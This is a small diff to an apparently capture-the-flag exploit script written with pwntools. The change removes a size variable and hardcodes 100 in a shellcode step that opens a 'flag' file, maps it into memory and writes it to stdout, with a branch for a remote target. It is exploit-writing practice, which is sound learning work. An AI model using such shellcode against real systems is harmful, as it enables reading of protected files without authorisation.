@@ -10,7 +10,6 @@ c
 
 context.arch = "amd64"
 exe = './open_what_write'
-size = 100
 
 # the exploit will be made out of 3 parts:
 # 1. opening the file "flag"
@@ -42,7 +41,7 @@ shellcode += '''
 '''
 
 # 3. writing the mapped content to the stdout
-shellcode += shellcraft.write(1, 'rbx', size)
+shellcode += shellcraft.write(1, 'rbx', 100)
 exploit = asm(shellcode)
 
 if args.REMOTE:
